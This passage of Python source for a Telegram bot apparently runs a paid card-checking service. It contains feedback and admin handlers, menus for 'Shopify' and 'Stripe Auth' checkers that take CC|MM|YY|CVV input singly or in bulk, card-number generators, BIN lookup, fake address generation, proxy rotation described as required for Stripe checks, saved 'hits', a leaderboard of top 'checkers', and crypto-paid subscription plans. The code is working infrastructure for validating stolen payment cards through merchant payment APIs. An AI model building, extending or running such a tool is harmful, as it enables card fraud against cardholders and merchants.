        file_id = source.document.file_id; file_type = "document"; text = source.caption or ""
    elif source.video:
        file_id = source.video.file_id; file_type = "video"; text = source.caption or ""
    elif source.audio:
        file_id = source.audio.file_id; file_type = "audio"; text = source.caption or ""
    elif source.text:
        text = source.text
    if not text and not file_id:
        args = msg.text.split(maxsplit=1)
        if len(args) > 1: text = args[1]
    if not text and not file_id:
        return await msg.answer(
            f"{pe('chat')} <b>{sc('Feedback')}</b>\n"
            f"<blockquote>{pe('docs')} {sc('Usage')}:\n"
            f"<code>/fb Your message here</code>\n"
            f"{sc('Or reply to any message with')} <code>/fb</code></blockquote>",
            parse_mode="HTML")
    with db() as c:
        fid = c.execute(
            "INSERT INTO feedback(uid, username, msg_type, text, file_id, file_type, ts, status) "
            "VALUES(?,?,?,?,?,?,?,'pending')",
            (uid, username, file_type, text, file_id, file_type,
             datetime.now(timezone.utc).isoformat())).lastrowid
    await submit_feedback_for_approval(msg.bot, fid, uid, username, text, file_id, file_type)
    await msg.answer(
        f"{pe('check')} <b>{sc('Feedback submitted for approval')}</b>\n"
        f"<blockquote>{pe('hourglass')} {sc('Admin will review shortly')}</blockquote>",
        parse_mode="HTML")

# ── Feedback approval callbacks ───────────────────────────────────────────
@router.callback_query(F.data.startswith("fb_approve:"))
async def cb_fb_approve(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        return await cb.answer("Admin only", show_alert=True)
    try: fid = int(cb.data.split(":")[1])
    except: return await cb.answer("Bad id", show_alert=True)
    with db() as c:
        row = c.execute("SELECT * FROM feedback WHERE id=?", (fid,)).fetchone()
    if not row:
        return await cb.answer("Not found", show_alert=True)
    if row["status"] != "pending":
        return await cb.answer(f"Already {row['status']}", show_alert=True)
    with db() as c:
        c.execute("UPDATE feedback SET status='approved', approved_by=? WHERE id=?",
                  (cb.from_user.id, fid))
    await _send_feedback_to_channels(cb.bot, fid, row["uid"], row["username"] or "",
                                     row["text"] or "", row["file_id"] or "",
                                     row["file_type"] or "none")
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    try:
        await cb.message.reply(
            f"{pe('check')} <b>{sc('Feedback')} #{fid} {sc('approved & published')}</b>",
            parse_mode="HTML")
    except: pass
    await cb.answer("Approved ✓")

@router.callback_query(F.data.startswith("fb_reject:"))
async def cb_fb_reject(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        return await cb.answer("Admin only", show_alert=True)
    try: fid = int(cb.data.split(":")[1])
    except: return await cb.answer("Bad id", show_alert=True)
    with db() as c:
        c.execute("UPDATE feedback SET status='rejected', approved_by=? WHERE id=?",
                  (cb.from_user.id, fid))
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    try:
        await cb.message.reply(
            f"{pe('cross1')} <b>{sc('Feedback')} #{fid} {sc('rejected')}</b>",
            parse_mode="HTML")
    except: pass
    await cb.answer("Rejected ✗")

@router.callback_query(F.data.startswith("fb_reply:"))
async def cb_fb_reply(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        return await cb.answer("Not admin", show_alert=True)
    parts = cb.data.split(":")
    fid, target_uid = parts[1], parts[2]
    set_awaiting(cb.from_user.id, f"fb_reply:{fid}:{target_uid}")
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.message.answer(
        f"{pe('chat')} <b>{sc('Reply to Feedback')} #{fid}</b>\n"
        f"<blockquote>{pe('pen')} {sc('Type your reply below')}:</blockquote>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Cancel"), icon="cross1", color="danger",
                  callback_data="admin:close")
        ]]))
    await cb.answer()

@router.callback_query(F.data.startswith("fb_genkey:"))
async def cb_fb_genkey(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        return await cb.answer("Not admin", show_alert=True)
    target_uid = int(cb.data.split(":")[1])
    code = f"{KEY_PREFIX}-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    with db() as c:
        c.execute("INSERT INTO redeem_codes(code, plan, max_uses, days, used) "
                  "VALUES(?,?,?,?,0)", (code, "pro", 1, 30))
    await cb.answer(f"Key: {code}", show_alert=True)
    try:
        await _bot_ref.send_message(
            target_uid,
            f"{pe('gem')} <b>{sc('Your Key')}</b>\n"
            f"<blockquote><code>{code}</code>\n"
            f"{pe('hourglass')} {sc('Pro · 30 days')}</blockquote>",
            parse_mode="HTML")
    except: pass

# ── /iadmin ───────────────────────────────────────────────────────────────
@router.message(Command("iadmin"))
async def cmd_iadmin(msg: Message):
    uid = msg.from_user.id
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        return await msg.answer(
            f"{pe('chat')} <b>{sc('Message Admin')}</b>\n"
            f"<blockquote><code>/iadmin Your message</code></blockquote>",
            parse_mode="HTML")
    text = args[1]
    username = msg.from_user.username or ""
    admin_text = (
        f"{pe('user')} <b>{sc('User Message')}</b>\n"
        f"<blockquote>{pe('diamond')} UID: <code>{uid}</code>\n"
        f"{pe('link')} @{esc(username or 'N/A')}</blockquote>\n"
        f"<blockquote>{esc(text[:1000])}</blockquote>"
    )
    reply_kb = InlineKeyboardMarkup(inline_keyboard=[[
        pbtn(sc("Reply"), icon="chat", color="success",
              callback_data=f"iadmin_reply:{uid}"),
        pbtn(sc("Gen Key"), icon="gem", color="success",
              callback_data=f"fb_genkey:{uid}")
    ]])
    sent = False
    for admin_id in ADMIN_IDS:
        try:
            await msg.bot.send_message(admin_id, admin_text, parse_mode="HTML",
                                       reply_markup=reply_kb)
            sent = True
        except: pass
    if sent:
        await msg.answer(f"{pe('check')} <b>{sc('Message sent to admin')}</b>",
                         parse_mode="HTML")
    else:
        await msg.answer(f"{pe('cross1')} <b>{sc('Failed to reach admin')}</b>",
                         parse_mode="HTML")

@router.callback_query(F.data.startswith("iadmin_reply:"))
async def cb_iadmin_reply(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        return await cb.answer("Not admin", show_alert=True)
    target_uid = cb.data.split(":")[1]
    set_awaiting(cb.from_user.id, f"iadmin_reply:{target_uid}")
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.message.answer(
        f"{pe('chat')} <b>{sc('Reply to User')} {target_uid}</b>\n"
        f"<blockquote>{pe('pen')} {sc('Type reply below')}:</blockquote>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Cancel"), icon="cross1", color="danger",
                  callback_data="admin:close")
        ]]))
    await cb.answer()

# ── /restore_done, /restore_clear ─────────────────────────────────────────
@router.message(Command("restore_done"))
async def cmd_restore_done(msg: Message):
    if not is_full_admin(msg.from_user.id): return
    base_candidates = [k for k, v in _restore_sessions.items()
                       if v.get("uid") == msg.from_user.id]
    if not base_candidates:
        return await msg.answer(f"{pe('warn')} <b>{sc('No restore session')}</b>",
                                parse_mode="HTML")
    base = base_candidates[-1]
    st = await msg.answer(f"{pe('loading')} <b>{sc('Finishing restore')}...</b>",
                          parse_mode="HTML")
    await _try_finish_multipart(msg, base, st)

@router.message(Command("restore_clear"))
async def cmd_restore_clear(msg: Message):
    if not is_full_admin(msg.from_user.id): return
    cleared = 0
    with _restore_lock:
        for k in [k for k, v in _restore_sessions.items()
                  if v.get("uid") == msg.from_user.id]:
            _restore_sessions.pop(k, None); cleared += 1
    await msg.answer(f"{pe('check')} <b>Cleared {cleared} session(s)</b>",
                     parse_mode="HTML")
                     # ── Keyboard builders ─────────────────────────────────────────────────────
def back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[[
        pbtn("Back", icon="back", color="primary", callback_data="menu:main")
    ]])

def main_menu_kb(user_id=0):
    kb = [
        [pbtn("Shopify", icon="shop", color="success", callback_data="menu:check"),
         pbtn("Stripe Auth", icon="gem", color="primary", callback_data="menu:auth_check")],
        [pbtn("Manage Proxy", icon="link", color="primary", callback_data="menu:proxy"),
         pbtn("Wishlist", icon="book", color="primary", callback_data="menu:wishlist")],
        [pbtn("Top Users", icon="chart", color="primary", callback_data="menu:top"),
         pbtn("Gift Credits", icon="gem", color="success", callback_data="menu:gift")],
        [pbtn("Info", icon="docs", color="primary", callback_data="menu:info"),
         pbtn("Tools", icon="tools", color="primary", callback_data="menu:tools")],
        [pbtn("Contact", icon="chat", color="success",
              url=get_setting("support_link", "https://t.me/Senselessme")),
         pbtn("Close", icon="cross1", color="danger", callback_data="menu:close")],
    ]
    if is_admin(user_id):
        kb.insert(0, [pbtn("Admin Panel", icon="settings", color="danger",
                          callback_data="menu:admin_panel")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def info_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Plans", icon="gem", color="success", callback_data="menu:shop"),
         pbtn("Profile", icon="user", color="primary", callback_data="menu:account")],
        [pbtn("Commands", icon="docs", color="primary", callback_data="menu:commands")],
        [pbtn("Back", icon="back", color="primary", callback_data="menu:main")],
    ])

def tools_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("VISA Gen", icon="gem", color="success", callback_data="gen:4"),
         pbtn("MASTER Gen", icon="gem2", color="success", callback_data="gen:5")],
        [pbtn("AMEX Gen", icon="gem3", color="success", callback_data="gen:34")],
        [pbtn("BIN Lookup", icon="shop", color="primary", callback_data="tool:bin"),
         pbtn("CC Formatter", icon="pen", color="primary", callback_data="tool:format")],
        [pbtn("Address Gen", icon="user", color="primary", callback_data="tool:addr")],
        [pbtn("Back", icon="back", color="primary", callback_data="menu:main")],
    ])

def shop_kb():
    rows = [[pbtn(f"{p['label']}", icon="star", color="success",
                  callback_data=f"buy:{k}")] for k, p in STAR_PRODUCTS.items()]
    rows.append([pbtn("Buy with USDT", icon="gem", color="primary", callback_data="shop:buy_usdt")])
    rows.append([pbtn("Buy with TON", icon="gem2", color="primary", callback_data="shop:buy_ton")])
    rows.append([pbtn("Back", icon="back", callback_data="menu:info")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def proxy_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Add Proxy", icon="add", color="success", callback_data="proxy:add")],
        [pbtn("Revalidate All", icon="refresh", color="primary", callback_data="proxy:check")],
        [pbtn("List Proxies", icon="docs", color="primary", callback_data="proxy:list")],
        [pbtn("Clear All", icon="trash", color="danger", callback_data="proxy:clear")],
        [pbtn("Back", icon="back", callback_data="menu:main")],
    ])

def limited_admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Generate Code", icon="add", color="success", callback_data="admin:gen_code")],
        [pbtn("Broadcast", icon="bell", color="primary", callback_data="admin:broadcast")],
        [pbtn("Close", icon="cross1", color="danger", callback_data="admin:close")],
    ])

def admin_main_kb(uid=0):
    if uid and is_limited_admin(uid) and not is_full_admin(uid):
        return limited_admin_kb()
    maint = get_setting("maintenance") == "1"
    return InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Dashboard", icon="chart", color="primary", callback_data="admin:stats"),
         pbtn(f"Maint: {'ON' if maint else 'OFF'}",
              icon="warn_red" if maint else "online",
              color="danger" if maint else "success",
              callback_data="admin:toggle_maint")],
        [pbtn("Bot Settings", icon="settings", color="primary", callback_data="admin:bot_settings"),
         pbtn("Pricing & Plans", icon="gem", color="success", callback_data="admin:plans_mgr")],
        [pbtn("User Manager", icon="user", color="success", callback_data="admin:user_mgr"),
         pbtn("Admin Manager", icon="settings", color="success", callback_data="admin:manage_admins")],
        [pbtn("Sites Manager", icon="shop", color="primary", callback_data="admin:sites"),
         pbtn("API Manager", icon="link", color="primary", callback_data="admin:apis")],
        [pbtn("Force Channels", icon="unlock", color="primary", callback_data="admin:force_list"),
         pbtn("Proxy Settings", icon="link", color="primary", callback_data="admin:proxy_mgr")],
        [pbtn("Charged Logs", icon="gem", color="success", callback_data="admin:charged_logs"),
         pbtn("System Logs", icon="docs", color="primary", callback_data="admin:sys_logs")],
        [pbtn("Check Logs", icon="docs", color="success", callback_data="admin:check_logs"),
         pbtn("Error Logs", icon="warn_red", color="danger", callback_data="admin:error_logs")],
        [pbtn("Broadcast", icon="bell", color="primary", callback_data="admin:broadcast"),
         pbtn("Promo Codes", icon="add", color="success", callback_data="admin:promos")],
        [pbtn("DB Backup", icon="docs", color="success", callback_data="admin:backup_now"),
         pbtn("DB Restore", icon="refresh", color="danger", callback_data="admin:restore_db")],
        [pbtn("Free Trial", icon="star", color="primary", callback_data="admin:trial_setup"),
         pbtn("Crypto Wallets", icon="gem2", color="success", callback_data="admin:wallet_setup")],
        [pbtn("Site Checker", icon="shop", color="primary", callback_data="admin:site_chkr"),
         pbtn("FB Channels", icon="chat", color="primary", callback_data="admin:fb_channels")],
        [pbtn("Scrapper GCs", icon="ghost", color="primary", callback_data="admin:scrapper_mgr"),
         pbtn("Clear Cache", icon="trash", color="danger", callback_data="admin:clear_cache")],
        [pbtn("Stripe SK", icon="gem", color="success", callback_data="admin:set_stripe_sk")],
        [pbtn("Close Panel", icon="cross1", color="danger", callback_data="admin:close")],
    ])

# ── Menu editing helpers ──────────────────────────────────────────────────
async def edit_admin(cb: CallbackQuery, text: str, kb=None, photo: Optional[str] = None):
    m = cb.message
    photo = photo or IMG_MAIN
    try:
        if m.photo or m.video:
            try:
                await m.edit_caption(caption=text, parse_mode="HTML", reply_markup=kb)
                return
            except TelegramBadRequest as e:
                if "not modified" in str(e).lower(): return
                raise
        else:
            try:
                await m.edit_text(text, parse_mode="HTML", reply_markup=kb)
                return
            except TelegramBadRequest as e:
                if "not modified" in str(e).lower(): return
                raise
    except:
        try:
            if photo:
                await m.answer_photo(photo=photo, caption=text,
                                     parse_mode="HTML", reply_markup=kb)
            else:
                await m.answer(text, parse_mode="HTML", reply_markup=kb)
        except:
            await m.answer(text, parse_mode="HTML", reply_markup=kb)

async def safe_edit_media(cb, photo_or_video, caption, kb):
    m = cb.message
    photo_or_video = photo_or_video or IMG_MAIN
    try:
        is_vid = str(photo_or_video).endswith(".mp4")
        if not m.photo and not m.video:
            try:
                await m.edit_text(caption, parse_mode="HTML", reply_markup=kb)
                return
            except TelegramBadRequest as e:
                if "no text in the message" not in str(e).lower():
                    raise
        if is_vid:
            await m.edit_media(
                media=InputMediaVideo(media=photo_or_video, caption=caption,
                                      parse_mode="HTML"),
                reply_markup=kb)
        else:
            await m.edit_media(
                media=InputMediaPhoto(media=photo_or_video, caption=caption,
                                      parse_mode="HTML"),
                reply_markup=kb)
    except TelegramBadRequest as e:
        if "not modified" in str(e).lower(): pass
        else:
            try:
                if str(photo_or_video).endswith(".mp4"):
                    await m.answer_video(video=photo_or_video, caption=caption,
                                         parse_mode="HTML", reply_markup=kb)
                else:
                    await m.answer_photo(photo=photo_or_video, caption=caption,
                                         parse_mode="HTML", reply_markup=kb)
            except:
                await m.answer(caption, parse_mode="HTML", reply_markup=kb)
    except:
        await m.answer(caption, parse_mode="HTML", reply_markup=kb)

# ── User menu callbacks ───────────────────────────────────────────────────
@router.callback_query(F.data == "menu:main")
async def cb_main(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, '')
    user = get_user_or_create(cb.from_user.id, cb.from_user.username or "")
    if not user:
        return await cb.answer("Try /start", show_alert=True)
    media = get_setting("asset_VID_MAIN") or random.choice(VIDEOS)
    await safe_edit_media(cb, media, welcome_text(user, cb.from_user.first_name),
                         main_menu_kb(cb.from_user.id))
    await cb.answer()

@router.callback_query(F.data == "menu:close")
async def cb_close(cb: CallbackQuery):
    try: await cb.message.delete()
    except: pass
    await cb.answer()

@router.callback_query(F.data == "menu:info")
async def cb_info(cb: CallbackQuery):
    text = (
        f"{pe('gem')} <b>[=] Info » Plans, Profile & Commands » {pe('gem')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('star')} <b>[=] Plans » View available plans & pricing » {pe('star')}</b>\n"
        f"{pe('gem')} <b>[=] Profile » Account info, rank & stats » {pe('gem')}</b>\n"
        f"{pe('up')} <b>[=] Commands » Full command reference guide » {pe('up')}</b>"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), text, info_menu_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:commands")
async def cb_commands(cb: CallbackQuery):
    text = (
        f"{pe('up')} <b>[=] Commands » Reference » {pe('up')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('shop')} <b>/sh</b> » Shopify Single\n"
        f"{pe('refresh')} <b>/msh</b> » Shopify Mass\n"
        f"{pe('gem')} <b>/auth</b> » Stripe Single\n"
        f"{pe('gem2')} <b>/masssa</b> » Stripe Mass\n"
        f"{pe('diamond')} <b>/bin</b> » BIN Lookup\n"
        f"{pe('star')} <b>/gen</b> » CC Generator\n"
        f"{pe('pen')} <b>/format</b> » CC Formatter\n"
        f"{pe('user')} <b>/addr</b> » Address Gen\n"
        f"{pe('link')} <b>/chk</b> » Proxy Check\n"
        f"{pe('gem3')} <b>/redeem</b> » Redeem Key\n"
        f"{pe('chart')} <b>/top</b> » Leaderboard"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), text, back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:tools")
async def cb_tools(cb: CallbackQuery):
    text = (
        f"{pe('up')} <b>[=] Tools » Checker & Utilities » {pe('up')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('gem')} <b>[=] CC Generators » VISA · MC · AMEX » {pe('gem')}</b>\n"
        f"{pe('shop')} <b>[=] BIN Lookup » Card issuer info » {pe('shop')}</b>\n"
        f"{pe('pen')} <b>[=] CC Formatter » Normalize any format » {pe('pen')}</b>\n"
        f"{pe('user')} <b>[=] Address Gen » Random worldwide » {pe('user')}</b>"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), text, tools_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:top")
async def cb_top(cb: CallbackQuery):
    with db() as c:
        rows = c.execute("SELECT uid, username, total_hits FROM users "
                         "WHERE total_hits > 0 ORDER BY total_hits DESC LIMIT 10").fetchall()
    text = f"{pe('chart')} <b>Top 10 Checkers</b>\n<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
    for i, r in enumerate(rows, 1):
        text += f"{i}. <code>{r['uid']}</code> ({esc(r['username'] or 'N/A')}) ~ <b>{r['total_hits']} hits</b>\n"
    text += "━━━━━━━━━━━━━━━━━━━━</blockquote>"
    await safe_edit_media(cb, random.choice(VIDEOS), text, back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:gift")
async def cb_gift(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, "gift_credits")
    await edit_admin(
        cb,
        f"{pe('gem')} <b>{sc('Gift Credits')}</b>\n"
        f"<blockquote>Usage: <code>@username amount</code>\n"
        f"Example: <code>@Rahul 50</code></blockquote>",
        back_kb())
    await cb.answer()

# ── Menu:check (Shopify) ──────────────────────────────────────────────────
@router.callback_query(F.data == "menu:check")
async def cb_check_menu(cb: CallbackQuery):
    text = (
        f"{pe('up')} <b>[=] Shopify Checker » {pe('up')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"<b>[=] Single » <code>/sh CC|MM|YY|CVV</code></b>\n"
        f"<b>[=] Mass » <code>/msh</code></b>\n\n"
        f"{pe('star')} <b>[=] Uses Shopify API endpoints » {pe('star')}</b>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Add Proxy", icon="add", color="success", callback_data="proxy:add")],
        [pbtn("Back", icon="back", color="primary", callback_data="menu:main")],
    ])
    await safe_edit_media(cb, random.choice(VIDEOS), text, kb)
    await cb.answer()

# ── Menu:auth_check (Stripe) ──────────────────────────────────────────────
@router.callback_query(F.data == "menu:auth_check")
async def cb_auth_check_menu(cb: CallbackQuery):
    text = (
        f"{pe('gem')} <b>{sc('Stripe Auth Checker')} » {pe('gem')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"<b>[=] {sc('Single')} » <code>/auth CC|MM|YY|CVV</code></b>\n"
        f"<b>[=] {sc('Mass')} » <code>/masssa</code></b>\n\n"
        f"{pe('warn')} <b>[=] {sc('Proxy required for Stripe auth')} » {pe('warn')}</b>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Add Proxy", icon="add", color="success", callback_data="proxy:add")],
        [pbtn("Back", icon="back", color="primary", callback_data="menu:main")],
    ])
    await safe_edit_media(cb, random.choice(VIDEOS), text, kb)
    await cb.answer()

# ── Proxy menu ────────────────────────────────────────────────────────────
@router.callback_query(F.data == "menu:proxy")
async def cb_proxy(cb: CallbackQuery):
    proxies = user_proxy_all(cb.from_user.id)
    live_count = sum(1 for p in proxies if p['status'] == 'live')
    text = (
        f"{pe('link')} <b>[=] {sc('Proxy Manager')} » {pe('link')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('online')} <b>[=] {sc('Live')} » {live_count}</b>\n"
        f"{pe('docs')} <b>[=] {sc('Total')} » {len(proxies)}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('warn')} <b>[=] {sc('Proxy required for Stripe auth')}</b>"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), text, proxy_kb(cb.from_user.id))
    await cb.answer()

@router.callback_query(F.data == "proxy:add")
async def cb_proxy_add(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, "add_proxy")
    text = (
        f"{pe('add')} <b>{sc('Add Proxies')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"<blockquote>{pe('pen')} <b>{sc('Paste proxies — one per line')}:</b>\n"
        f"<code>user:pass@host:port</code>\n"
        f"<code>host:port:user:pass</code>\n"
        f"<code>socks5://user:pass@host:port</code></blockquote>"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), text,
                         InlineKeyboardMarkup(inline_keyboard=[[
                             pbtn(sc("Back"), icon="back", color="primary",
                                  callback_data="menu:proxy")
                         ]]))
    await cb.answer()

@router.callback_query(F.data == "proxy:check")
async def cb_proxy_check(cb: CallbackQuery):
    try: await cb.answer("Testing...")
    except: pass
    rows = user_proxy_all(cb.from_user.id)
    if not rows:
        return await safe_edit_media(
            cb, random.choice(VIDEOS),
            f"{pe('warn')} <b>{sc('No proxies found')}</b>",
            proxy_kb(cb.from_user.id))
    try:
        await cb.message.edit_caption(
            caption=f"{pe('loading')} <b>{sc('Testing')} {len(rows)} {sc('proxies')}...</b>",
            parse_mode="HTML")
    except: pass
    alive, dead = 0, 0
    sem = asyncio.Semaphore(PROXY_TEST_BATCH)
    now = datetime.now(timezone.utc).isoformat()
    lock = asyncio.Lock()
    async def t(p):
        nonlocal alive, dead
        async with sem:
            r = await check_proxy_hq(p)
            async with lock:
                if r.get("ok"):
                    with db() as c:
                        c.execute("UPDATE user_proxies SET status='live', latency=?, checked_at=? "
                                  "WHERE uid=? AND proxy=?",
                                  (r.get("latency", 0), now, cb.from_user.id, p))
                    alive += 1
                else:
                    with db() as c:
                        c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?",
                                  (cb.from_user.id, p))
                    dead += 1
    await asyncio.gather(*(t(r["proxy"]) for r in rows))
    result_text = (
        f"{pe('check')} <b>{sc('Revalidated')}</b>\n"
        f"<blockquote>{pe('online')} {sc('Live')}: <b>{alive}</b>\n"
        f"{pe('cross2')} {sc('Removed')}: <b>{dead}</b></blockquote>"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), result_text,
                         proxy_kb(cb.from_user.id))

@router.callback_query(F.data == "proxy:list")
async def cb_proxy_list(cb: CallbackQuery):
    try: await cb.answer()
    except: pass
    rows = user_proxy_all(cb.from_user.id)
    if not rows:
        return await safe_edit_media(
            cb, random.choice(VIDEOS),
            f"{pe('warn')} <b>{sc('No proxies found')}</b>",
            proxy_kb(cb.from_user.id))
    lines = [f"{pe('docs')} <b>{sc('Your Proxies')} ({len(rows)})</b>\n<blockquote>"]
    for r in rows[:25]:
        if r["status"] == "live": icon = pe("check")
        elif r["status"] == "dead": icon = pe("cross2")
        else: icon = pe("warn")
        latency = f"{r['latency']:.2f}s" if r.get("latency") else "—"
        display = esc(proxy_display(r["proxy"])[:45])
        lines.append(f"{icon} <code>{display}</code> · {latency}")
    if len(rows) > 25:
        lines.append(f"<i>...and {len(rows)-25} more</i>")
    lines.append("</blockquote>")
    await safe_edit_media(cb, random.choice(VIDEOS), "\n".join(lines),
                         proxy_kb(cb.from_user.id))

@router.callback_query(F.data == "proxy:clear")
async def cb_proxy_clear(cb: CallbackQuery):
    try: await cb.answer()
    except: pass
    clear_user_proxies(cb.from_user.id)
    text = (
        f"{pe('trash')} <b>{sc('All Proxies Cleared')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"<blockquote>{pe('online')} {sc('Live')}: <b>0</b>\n"
        f"{pe('docs')} {sc('Total')}: <b>0</b></blockquote>"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), text,
                         proxy_kb(cb.from_user.id))

# ── Wishlist ──────────────────────────────────────────────────────────────
@router.callback_query(F.data == "menu:wishlist")
async def cb_wishlist(cb: CallbackQuery):
    uid = cb.from_user.id
    with db() as c:
        rows = c.execute("SELECT cc FROM saved_cards WHERE uid=? ORDER BY id DESC LIMIT 20",
                         (uid,)).fetchall()
    if not rows:
        text = f"{pe('book')} <b>Wishlist</b>\n<blockquote>Empty. Save hits to add cards.</blockquote>"
    else:
        cards = [r["cc"] for r in rows]
        text = (f"{pe('book')} <b>Wishlist ({len(cards)})</b>\n"
                f"<blockquote><code>{chr(10).join(cards)}</code></blockquote>")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Check All (Shopify)", icon="shop", color="success",
              callback_data="wishlist:check")],
        [pbtn("Back", icon="back", color="primary", callback_data="menu:main")],
    ])
    await safe_edit_media(cb, random.choice(VIDEOS), text, kb)
    await cb.answer()

@router.callback_query(F.data == "wishlist:check")
async def cb_wishlist_check(cb: CallbackQuery):
    uid = cb.from_user.id
    with db() as c:
        rows = c.execute("SELECT cc FROM saved_cards WHERE uid=? ORDER BY id DESC LIMIT 20",
                         (uid,)).fetchall()
    if not rows:
        return await cb.answer("Wishlist is empty.", show_alert=True)
    cards = [r["cc"] for r in rows]
    await cb.answer("Starting mass check...")
    await run_mass_check(cb.message, cards, cb.bot, bypass_quota=is_admin(uid),
                         uid=uid, username=cb.from_user.username or "",
                         mode="shopify")

# ── Account ───────────────────────────────────────────────────────────────
@router.callback_query(F.data == "menu:account")
async def cb_account(cb: CallbackQuery):
    user = get_user_or_create(cb.from_user.id, cb.from_user.username or "")
    if not user:
        return await cb.answer("Try /start", show_alert=True)
    pk = user["plan"] if user["plan"] in PLANS else "free"
    proxies = user_proxy_all(cb.from_user.id)
    text = (
        f"{pe('chat2')} <b>[=] Profile » User Info » {pe('chat2')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"<b>[=] Name » <i>{esc(cb.from_user.first_name)}</i> «</b>\n"
        f"{pe('link')} <b>[=] Handle » @{esc(cb.from_user.username or 'N/A')} » {pe('link')}</b>\n"
        f"{pe('diamond')} <b>[=] ID » {cb.from_user.id} » {pe('diamond')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('chat2')} <b>[=] Role » {sc('Admin' if is_admin(cb.from_user.id) else 'User')}</b>\n"
        f"{pe('star')} <b>[=] Plan » {sc(PLANS[pk]['name'])}</b>\n"
        f"{pe('hourglass')} <b>[=] Expires » {sc('Never' if pk == 'unlimited' or not user['premium_until'] else user['premium_until'][:10])}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('link')} <b>[=] Proxies » {len(proxies)}</b>\n"
        f"{pe('chart')} <b>[=] Rank » {sc('God' if user['total_hits'] > 500 else 'Hitter' if user['total_hits'] > 50 else 'Noob')}</b>\n"
        f"{pe('check')} <b>[=] Hits » {user['total_hits']}</b>\n"
        f"{pe('gem3')} <b>[=] Redeem » /redeem KEY</b>"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), text, back_kb())
    await cb.answer()

# ── PLANS PAGE — @Senselessme fixed ────────────────────────────────────────
@router.callback_query(F.data == "menu:shop")
async def cb_shop(cb: CallbackQuery):
    pw = get_setting('price_weekly', '10')
    pm = get_setting('price_monthly', '30')
    text = (
        f"{pe('gem')} <b>[=] Plans » Access Plans » {pe('gem')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('check')} <b>[=] Checks » Unlimited · no deduction » {pe('check')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('star')} <b>[=] Trial » Free » {pe('star')}</b>\n"
        f"{pe('hourglass')} <b>[=] Duration » {get_setting('trial_hours', '3')} Hours</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('gem')} <b>[=] Weekly » ${pw} · 7 Days</b>\n"
        f"{pe('up')} <b>[=] Bi-Weekly » $18 · 15 Days</b>\n"
        f"{pe('check')} <b>[=] Monthly » ${pm} · 30 Days</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('gem3')} <b>[=] Redeem » /redeem KEY</b>\n"
        f"{pe('user')} <b>[=] Contact Owner » {owner_link()} » {pe('link')}</b>"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), text, shop_kb())
    await cb.answer()

@router.callback_query(F.data == "shop:buy_usdt")
async def cb_buy_usdt(cb: CallbackQuery):
    wallet = get_setting("wallet_usdt", "Not Set")
    await cb.answer(f"Send payment to: {wallet}\nAfter paying, contact @Senselessme",
                    show_alert=True)

@router.callback_query(F.data == "shop:buy_ton")
async def cb_buy_ton(cb: CallbackQuery):
    wallet = get_setting("wallet_ton", "Not Set")
